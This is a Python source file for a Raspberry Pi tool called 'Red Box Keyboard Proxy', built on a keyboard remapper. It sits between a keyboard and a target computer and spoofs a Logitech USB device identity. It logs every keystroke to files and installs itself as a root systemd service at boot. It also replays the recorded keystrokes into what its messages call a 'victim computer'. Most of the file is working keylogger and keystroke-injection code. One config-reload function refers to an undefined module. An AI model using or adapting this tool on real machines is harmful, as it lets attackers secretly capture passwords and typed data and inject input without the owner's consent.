# Copyright 2021 by Viggo Falster (https://github.com/viggofalster)
# All rights reserved.
# This file is part of KIRI - Keyboard Interception, Remapping and Injection using Raspberry Pi as a HID Proxy,
# and is released under the "MIT License Agreement". Please see the LICENSE
# file that should have been included as part of this package.

import importlib
import logging
import sys
import evdev
import time
from evdev import InputDevice, categorize, ecodes
from hid_keys import hid_key_map as hid_keys
import click
import subprocess
import inspect
import shutil
import os
import sys
import yaml
import pathlib
import uuid
import rstr
import socket
import netifaces
import base64
import inspect

class Kiri:
    def __init__(self,key_log_path,raw_log_path,record=False):
        if record:
            self.report_file = raw_log_path
            open(self.report_file,"wb").close()
        else:
            self.report_file = "/dev/hidg0"
        self.key_log_file = open(key_log_path,"ab")
        self.raw_log_file = open(raw_log_path,"ab")
        self.log = logging.getLogger()
        self.default_log_level = logging.INFO
        self.log.setLevel(level=self.default_log_level)
        self.log_handler = logging.StreamHandler(sys.stdout)
        self.log_handler.setLevel(logging.DEBUG)
        self.log_formatter = logging.Formatter('[%(asctime)s|%(name)s|%(levelname)s] %(message)s')
        self.log_handler.setFormatter(self.log_formatter)
        self.log.addHandler(self.log_handler)

        self.configuration = Config()

        self.input_devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
        for input_device_no, input_device in enumerate(self.input_devices):
            self.log.info('Found device: %d, %s, %s, %s', input_device_no, input_device.path, input_device.name,
                          input_device.phys)

        self.device = None
        while self.device is None:
            try:
                self.device = InputDevice('/dev/input/event0')
            except:
                self.log.info("No keyboard - waiting...")
                time.sleep(5)

        self.log.info('Grabbing device: %s, %s, %s', self.device.path, self.device.name, self.device.phys)

        # grab provides exclusive access to the device
        self.device.grab()

        self.modifiers = {'KEY_LEFTCTRL': 0, 'KEY_LEFTSHIFT': 1, 'KEY_LEFTALT': 2, 'KEY_LEFTMETA': 3,
                          'KEY_RIGHTCTRL': 4, 'KEY_RIGHTSHIFT': 5, 'KEY_RIGHTALT': 6, 'KEY_RIGHTMETA': 7}
        self.modifier: chr = 0b00000000
        self.pressed_keys = set()

        self.is_caps_active = False
        self.is_right_alt_active = False
        self.is_debug_logging_active = False
        self.is_active = True
        self.log.info('Activated - ready for key processing')

    def reset(self):
        try:
            self.modifier: chr = 0b00000000
            self.pressed_keys = set()
            self.write_report(chr(0) * 8)
        except Exception as e:
            self.log.error('Failed to reset: %s', str(e))

    def run(self):
        for event in self.device.read_loop():
            if event.type == ecodes.EV_KEY:
                try:
                    data = categorize(event)
                    self.key_log_file.write(f"{str(data)}\n".encode())
                    self.key_log_file.flush()
                    print(data)
                    emit, keycode, keystate = self.configuration.remap_intercept(kiri=self, data=data)
                    if emit is False:
                        continue

                    if keycode in self.modifiers:
                        self.update_modifier(keycode, keystate)
                    else:
                        if keystate == 0:
                            self.release(keycode)

                        if keystate == 1:
                            self.press(keycode)

                        if keystate == 2:
                            # ignore update
                            continue
                        #     self.release(keycode)
                        #     self.press(keycode)

                except Exception as e:
                    self.log.error('run loop error: %s', e, exc_info=True)
                    self.reset()

    def reload_config(self):
        self.log.info('reloading config begin')
        importlib.reload(config)
        self.configuration = config.Config()
        self.log.info('reloading config end')

    def toggle_debug_logging(self):
        if self.is_debug_logging_active:
            self.is_debug_logging_active = False
            self.log.setLevel(level=self.default_log_level)
        else:
            self.is_debug_logging_active = True
            self.log.setLevel(level=logging.DEBUG)

    def update_modifier(self, keycode, keystate):
        if keystate == 0:
            self.modifier = self.clear_bit(self.modifier, self.modifiers[keycode])
            self.update_state()
        if keystate == 1:
            self.modifier = self.set_bit(self.modifier, self.modifiers[keycode])
            self.update_state()

    def update_state(self):
        pressed_chars = ''.join([chr(hid_keys[pressed_key]) for pressed_key in self.pressed_keys][:6])
        self.write_report(chr(self.modifier) + chr(0) + pressed_chars + chr(0) * (6 - len(pressed_chars)))

    def release(self, keycode):
        if keycode in self.pressed_keys:
            self.pressed_keys.remove(keycode)
            self.update_state()

    def press(self, keycode):
        if keycode not in self.pressed_keys:
            self.pressed_keys.add(keycode)
            self.update_state()

    def write_report(self, report: str):
        self.log.debug('Writing report to output: %s', ":".join("{:02x}".format(c) for c in report.encode('utf-8')))
        with open(self.report_file, 'rb+') as fd:
            self.raw_log_file.write(report.encode())
            self.raw_log_file.flush()
            fd.write(report.encode())

    @staticmethod
    def set_bit(value, bit):
        return value | (1 << bit)

    @staticmethod
    def clear_bit(value, bit):
        return value & ~(1 << bit)

class Config:
    def remap_intercept(self, kiri: Kiri, data):
        scancode = data.scancode
        keycode = data.keycode
        keystate = data.keystate
        emit = True

        kiri.log.debug('Intercept begin. %s: %d', keycode, keystate)

        if keycode == 'KEY_CAPSLOCK':
            emit = False
            if keystate == 0:
                kiri.is_caps_active = False
                kiri.reset()  # prevent remapped keys from hanging
            if keystate == 1:
                kiri.is_caps_active = True

        # special consideration for toggling active state
        if kiri.is_caps_active:
            if keycode == 'KEY_ESC' and keystate == 1:
                if kiri.is_active:
                    kiri.device.ungrab()
                    kiri.is_active = False
                else:
                    kiri.device.grab()
                    kiri.is_active = True

                kiri.log.debug('Is active: %s', str(kiri.is_active))
                return False, None, None

            if keycode == 'KEY_SYSRQ':
                if keystate == 1:
                    kiri.toggle_debug_logging()
                return False, None, None

            if keycode == 'KEY_HOME' and keystate == 1:
                kiri.reload_config()
                return False, None, None

        if not kiri.is_active:
            return False, None, None

        # if keycode == 'KEY_RIGHTALT':
        #     if keystate == 0:
        #         proxy.is_right_alt_active = False
        #     if keystate == 1:
        #         proxy.is_right_alt_active = True

        if kiri.is_caps_active:

            if keycode == 'KEY_T':
                keycode = 'KEY_INSERT'

            if keycode == 'KEY_8':
                keycode = 'KEY_BACKSLASH'
            if keycode == 'KEY_9':
                keycode = 'KEY_LEFTBRACE'
            if keycode == 'KEY_0':
                keycode = 'KEY_RIGHTBRACE'
            if keycode == 'KEY_Y':
                keycode = 'KEY_ESC'
            if keycode == 'KEY_U':
                keycode = 'KEY_HOME'
            if keycode == 'KEY_I':
                keycode = 'KEY_UP'
            if keycode == 'KEY_O':
                keycode = 'KEY_END'
            if keycode == 'KEY_P':
                keycode = 'KEY_PAGEUP'
            if keycode == 'KEY_J':
                keycode = 'KEY_LEFT'
            if keycode == 'KEY_K':
                keycode = 'KEY_DOWN'
            if keycode == 'KEY_L':
                keycode = 'KEY_RIGHT'
            if keycode == 'KEY_SEMICOLON':
                keycode = 'KEY_PAGEDOWN'
            if keycode == 'KEY_H':
                keycode = 'KEY_BACKSPACE'
            if keycode == 'KEY_N':
                keycode = 'KEY_DELETE'
            if keycode == 'KEY_M':
                keycode = 'KEY_ENTER'

        kiri.log.debug('Intercept end. %s: %d', keycode, keystate)

        return emit, keycode, keystate

class out():
    line_symbol = ""
    module = "keyboard-proxy"
    def error(text,module=module,line_symbol="[-]",print_output=True,suffix=""):
        prefix = click.style(f'{line_symbol} {module}: ', fg='red',bold=True)
        text = click.style(text)
        output = prefix + text + suffix
        if print_output:
            click.echo(output)
        else:
            return output

    def warning(text,module=module,line_symbol="[!]",print_output=True,suffix=""):
        prefix = click.style(f'{line_symbol} {module}: ', fg='yellow',bold=True)
        text = click.style(text)
        output = prefix + text + suffix
        if print_output:
            click.echo(output)
        else:
            return output

    def info(text,module=module,line_symbol="[*]",print_output=True,suffix=""):
        prefix = click.style(f'{line_symbol} {module}: ', fg='blue',bold=True)
        text = click.style(text)
        output = prefix + text + suffix
        if print_output:
            click.echo(output)
        else:
            return output

    def success(text,module=module,line_symbol="[+]",print_output=True,suffix=""):
        prefix = click.style(f'{line_symbol} {module}: ', fg='green',bold=True)
        text = click.style(text)
        output = prefix + text + suffix
        if print_output:
            click.echo(output)
        else:
            return output

    def debug(text,module=module,line_symbol="[DEBUG]",print_output=True,suffix=""):
        prefix = click.style(f'{line_symbol} {module}: ', fg='cyan',bold=True)
        text = click.style(text)
        output = prefix + text + suffix
        if print_output:
            click.echo(output)
        else:
            return output

def create_service(service_name, command,target="network-online.target",unit_options="",service_options="",install_options=""):
    systemd_path = "/etc/systemd/system/"
    service_path = systemd_path + service_name + ".service"
    service_script = f"/var/tmp/{service_name}.sh"

    if os.path.exists(service_path):
        stop_service(service_name)

    simple_service_template = inspect.cleandoc(f"""
        [Unit]
        Description={service_name}
        After={target}
        Wants={target}
        {unit_options}

        [Service]
        ExecStart=/bin/bash {service_script}
        {service_options}

        [Install]
        WantedBy=multi-user.target""")

    with open(service_script,"w") as new_service_script:
        new_service_script.write(command)

    with open(service_path,"w") as new_service:
        new_service.write(simple_service_template)

    execute_command("systemctl daemon-reload")

def delete_service(service_name):
    systemd_path = "/etc/systemd/system/"
    service_path = systemd_path + service_name + ".service"
    service_script = f"/var/tmp/{service_name}.sh"
    os.remove(service_path)
    os.remove(service_script)
    execute_command("systemctl daemon-reload")

def start_service(service_name):
    execute_command(f"systemctl start {service_name}.service")

def autostart_service(service_name,autostart=True):
    if autostart:
        execute_command(f"systemctl enable {service_name}.service")
    else:
        execute_command(f"systemctl disable {service_name}.service")

def stop_service(service_name):
    execute_command(f"systemctl stop {service_name}.service")

def execute_command(command, silent=True):
    if silent:
        subprocess.run(command,shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
    else:
        subprocess.run(command,shell=True)

def install():


    enable_kernel_modules = inspect.cleandoc("""
    echo "dtoverlay=dwc2" | tee -a /boot/config.txt
    echo "dwc2" | tee -a /etc/modules
    echo "libcomposite" | tee -a /etc/modules
    """)
    execute_command(enable_kernel_modules)

    startup_commands = inspect.cleandoc(r"""
    cd /sys/kernel/config/usb_gadget/
    mkdir -p keyboard_proxy
    cd keyboard_proxy
    echo 0x1d6b > idVendor # Linux Foundation
    echo 0x0104 > idProduct # Multifunction Composite Gadget
    echo 0x0100 > bcdDevice # v1.0.0
    echo 0x0200 > bcdUSB # USB2
    mkdir -p strings/0x409
    echo "2021080700000001" > strings/0x409/serialnumber
    echo "Logitech" > strings/0x409/manufacturer
    echo "Logitech MX 207" > strings/0x409/product
    mkdir -p configs/c.1/strings/0x409
    echo "Config 1: ECM network" > configs/c.1/strings/0x409/configuration
    echo 250 > configs/c.1/MaxPower

    # Add functions here
    mkdir -p functions/hid.usb0
    echo 1 > functions/hid.usb0/protocol
    echo 1 > functions/hid.usb0/subclass
    echo 8 > functions/hid.usb0/report_length
    echo -ne \\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0 > functions/hid.usb0/report_desc
    ln -s functions/hid.usb0 configs/c.1/
    # End functions
    ls /sys/class/udc > UDC
    """)

    stop_service("keyboard_proxy_config")
    create_service("keyboard_proxy_config",startup_commands)
    start_service("keyboard_proxy_config")
    autostart_service("keyboard_proxy_config")

@click.command()
@click.option('--key-logs', help='Destination path of the output file containing logged keys',type=str,required=True,default="/var/tmp/keyboard_proxy_log.txt",show_default=True)
@click.option('--raw-logs', help='Destination path for a raw USB report log file',type=str,required=True,default="/var/tmp/keyboard_proxy_usb_reports.txt",show_default=True)
@click.option('--record-keys', help='Record typed keys (no proxying)',is_flag=True,default=False,show_default=True)
@click.option('--repeat-keys', help='Repeats the logged keys',is_flag=True,default=False,show_default=True)
def cli(key_logs,raw_logs,record_keys,repeat_keys):
    """\b
Red Box Keyboard Proxy"""
    print("""
██   ██ ███████ ██    ██ ██████   ██████   █████  ██████  ██████      ██████  ██████   ██████  ██   ██ ██    ██
██  ██  ██       ██  ██  ██   ██ ██    ██ ██   ██ ██   ██ ██   ██     ██   ██ ██   ██ ██    ██  ██ ██   ██  ██
█████   █████     ████   ██████  ██    ██ ███████ ██████  ██   ██     ██████  ██████  ██    ██   ███     ████
██  ██  ██         ██    ██   ██ ██    ██ ██   ██ ██   ██ ██   ██     ██      ██   ██ ██    ██  ██ ██     ██
██   ██ ███████    ██    ██████   ██████  ██   ██ ██   ██ ██████      ██      ██   ██  ██████  ██   ██    ██
""")

    if os.geteuid() != 0:
        out.error("Root permissions required!")
        quit()

    if not os.path.exists("/sys/kernel/config/usb_gadget/keyboard_proxy"):
        out.info("This looks like your first usage!")
        out.info("Installing all the needed stuff!")
        install()
        out.success("Installation (most likely) successful!")
        out.warning("Restart required!")
        quit()

    if record_keys:
        recorded_keys_path = "/var/tmp/keyboard_proxy_recorded_keys.txt"
        out.info(f"Connect a USB keyboard to any free USB-A port and start typing!")
        out.info(f"Recording keystrokes does NOT require a connection to a victim computer.")
        out.info(f"Recorded keystrokes are stored at {recorded_keys_path}.")
        kiri = Kiri(key_logs,recorded_keys_path,True)
        kiri.run()

    elif repeat_keys:
        recorded_keys_path = "/var/tmp/keyboard_proxy_recorded_keys.txt"
        out.info(f"Reading raw USB reports from {recorded_keys_path} and repeating them as HID device!")
        out.info(f"Make sure your USB-C port is connected to a victim computer!")
        keys = open(raw_logs,"rb")
        with open('/dev/hidg0', 'rb+') as fd:
            while True:
                key = keys.read(8)
                if len(key) != 8:
                    break
                fd.write(key)

    else:
        out.success("Starting keyboard proxy!")
        out.info(f"Key logs can be found at: {key_logs}")
        out.info(f"Raw USB reports can be found at: {raw_logs}")
        kiri = Kiri(key_logs,raw_logs)
        kiri.run()

if __name__ == "__main__":
    cli()
